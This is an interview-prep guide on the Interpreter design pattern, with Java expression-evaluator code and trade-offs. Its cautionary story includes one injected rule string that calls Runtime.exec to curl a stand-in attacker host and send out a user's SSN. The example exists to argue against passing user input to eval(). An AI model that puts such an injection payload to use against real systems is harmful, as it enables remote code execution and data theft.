# 🔤 Interpreter Design Pattern - Interview Guide
## _15 YOE Architect-Level Conversational Script_

**📗 Difficulty: Beginner** — ideal starting point for a new developer; read this before tackling applied system-design questions.

> _(Companion to `transcript.md`, left untouched. Whiteboard-style scenario discussion.)_

---

**Interviewer**: "Design a simple rule engine / expression evaluator: given an expression like `a * b` and a context mapping `a=2, b=4`, compute the result. How would you generalize this to more complex expressions?"

**You**: "This is the **Interpreter Pattern** — it defines a grammar for a simple language (arithmetic expressions here) and provides a way to evaluate sentences in that grammar, using a **context** that supplies the actual values."

---

## 1. Architecture Diagram

```
                  ┌────────────────────────┐
                  │   AbstractExpression (I)     │
                  │  + interpret(Context)          │
                  └──────────┬───────────────────┘
              ┌─────────────┴──────────────┐
              ▼                                ▼
    ┌────────────────────┐         ┌──────────────────────┐
    │ TerminalExpression      │         │ NonTerminalExpression      │
    │ (a single symbol,          │         │ (an operator combining        │
    │  e.g. "a" or "b")            │         │  left + right sub-expressions) │
    │ + interpret(ctx) {              │         │ + interpret(ctx) {                │
    │     return ctx.get(this.value); │         │    return left.interpret(ctx)      │
    │  }                                 │         │           OP right.interpret(ctx)   │
    └────────────────────┘         └──────────────────────┘
                                                    (recursion: left/right can
                                                     themselves be Terminal OR
                                                     NonTerminal — tree structure)
```

**Expression tree for `a * b + c * d`:**
```
                    SumExpression (+)
                    /                \
        MultiplyExpr(a,b)      MultiplyExpr(c,d)
         /          \             /          \
   Terminal(a)  Terminal(b)  Terminal(c)  Terminal(d)
```

```java
interface Expression { int interpret(Map<String, Integer> context); }

class NumberExpression implements Expression {          // TERMINAL
    String symbol;
    NumberExpression(String symbol) { this.symbol = symbol; }
    public int interpret(Map<String, Integer> ctx) { return ctx.get(symbol); }
}

class MultiplyExpression implements Expression {        // NON-TERMINAL
    Expression left, right;
    MultiplyExpression(Expression l, Expression r) { left = l; right = r; }
    public int interpret(Map<String, Integer> ctx) {
        return left.interpret(ctx) * right.interpret(ctx);   // recursion!
    }
}

// Client
Map<String, Integer> context = Map.of("a", 2, "b", 4);
Expression expr = new MultiplyExpression(new NumberExpression("a"), new NumberExpression("b"));
int result = expr.interpret(context);   // -> 8
```

---

## 2. Scenario-First Explanation

**You**: "Two components make this work: **Abstract Expression** (which splits into Terminal — can't be divided further — and Non-Terminal — combines other expressions recursively), and **Context** (the runtime data that gives meaning to the symbols). The exact same expression tree evaluates differently for different contexts, e.g. `context = {a:2, b:4}` gives `8`, but `context = {a:10, b:1}` gives `10` — the tree structure never changes, only the context does."

---

## 3. Cross Questions

**Q: "Where is this actually used in production, not just interview whiteboards?"**
**A:** "Rule engines (Drools), regular expression engines, SQL parsers, spreadsheet formula evaluators (`=A1*B1+C1`), feature-flag targeting rules (`user.plan == 'premium' AND user.country == 'US'`), and simple DSLs for pricing/discount rules. Anywhere you need to represent and evaluate a small custom 'language' against changing input data."

**Q: "Isn't this recursive tree structure just... a Composite Pattern?"**
**A:** "Structurally, yes — Interpreter's expression tree IS built using Composite Pattern (terminal = leaf, non-terminal = composite). The difference is **intent**: Composite is about representing part-whole hierarchies generically (files/directories); Interpreter specifically adds the *evaluation/interpretation* semantics tied to a grammar and a context. Interpreter = Composite + a grammar-driven `interpret(context)` contract."

---

## 4. Trade-offs

| Aspect | Interpreter Pattern | Hardcoded `switch`/parser library (e.g. ANTLR) |
|---|---|---|
| Good for | Small, simple grammars | Complex grammars (full programming languages) |
| Extensibility | Add new expression types = new classes | Requires grammar file regeneration |
| Performance | Can be slow for deep/complex trees (many virtual calls) | Optimized parser-generated code, usually faster |
| Maintainability at scale | Degrades — pattern is for SIMPLE grammars per GoF's own caveat | Purpose-built for complex grammars |

---

## 5. Senior Trap Questions

**Trap: "Why not just use `eval()`-style string parsing or a scripting engine (e.g. embed JavaScript via Nashorn/GraalJS) instead of building this by hand?"**
**✅ Senior answer:** "For genuinely complex expression languages, I'd absolutely reach for a battle-tested parser/engine rather than hand-roll Interpreter Pattern — GoF's own book warns Interpreter doesn't scale well for complex grammars (class count explodes, one class per grammar rule). But for a SMALL, fixed, security-sensitive DSL — say, feature-flag targeting rules — I'd actually AVOID a general-purpose `eval()`/scripting engine, because it opens a code-injection attack surface (arbitrary code execution from user-controlled rule strings). Interpreter Pattern here gives me a **sandboxed, purpose-built, safe evaluator** with only the operations I explicitly implement — nothing more, nothing exploitable."

---

## 🔥 Real-World Production Issue: The Feature-Flag Rule Engine That Allowed Injection

*In plain English: letting user input reach a general-purpose script engine, instead of a safe and limited interpreter, opens the door to remote code execution.*

**The war story:**

"An earlier version of our feature-flag targeting system let product managers write raw boolean expressions like `user.country == 'US' && user.plan == 'premium'` which were evaluated using a **generic JavaScript engine** (Nashorn) for 'flexibility', instead of a purpose-built Interpreter."

```
┌────────────────────────────────────────────────────────┐
│ Rule string (from a CMS UI, editable by non-engineers):     │
│  "user.country == 'US'; java.lang.Runtime.getRuntime()          │
│   .exec('curl attacker.com/exfiltrate?data='+user.ssn)"           │
│                                                                     │
│  nashornEngine.eval(ruleString)   ◄── executes ARBITRARY Java/JS!    │
└────────────────────────────────────────────────────────┘
```

**Incident:** a mis-configured/compromised CMS account was able to inject a rule string that, when evaluated by the generic scripting engine, executed arbitrary system calls — a full **remote code execution (RCE)** vulnerability, caught by a security audit before real exploitation, but requiring an emergency patch and a full audit of every historical rule ever saved.

```
   Blast radius if exploited:
   CMS rule field (user-editable, "just a targeting rule")
        │
        ▼ eval() with a general-purpose scripting engine
   Full JVM process privileges
        │
        ▼
   Read secrets, exfiltrate data, pivot to other services -- RCE
```

**The fix:**
- Replaced the generic scripting engine with a hand-rolled **Interpreter Pattern**: a strict grammar of ONLY `AND`, `OR`, `==`, `!=`, and whitelisted `user.*` attribute lookups via a `Context` map — no arbitrary method calls, no reflection, no I/O possible even in principle, because those `Expression` classes were simply never implemented.
- Added a schema-validated rule editor UI so PMs could only construct valid expression trees, never raw strings passed to `eval()`.

**Lesson for a new developer:** "When you need a small, fixed, business-user-editable rule language, resist the temptation to reach for a generic `eval()`/scripting engine 'for flexibility' — that flexibility IS the attack surface. Interpreter Pattern's constrained, purpose-built grammar is not just an academic OOP exercise; it's a legitimate **security control** by construction, because it structurally cannot execute anything beyond what you explicitly coded."

---

## 🎓 Final Tips
1. Interpreter Pattern = grammar (Terminal + Non-Terminal expressions) + Context, evaluated recursively.
2. It's Composite Pattern's tree structure, specialized for grammar evaluation.
3. Good for small, fixed DSLs; avoid for complex/general-purpose languages (use a real parser generator instead).
4. In security-sensitive contexts, Interpreter's constrained grammar is safer than a generic `eval()`/scripting engine — never let user input reach a general-purpose interpreter directly.

Good luck! 🚀
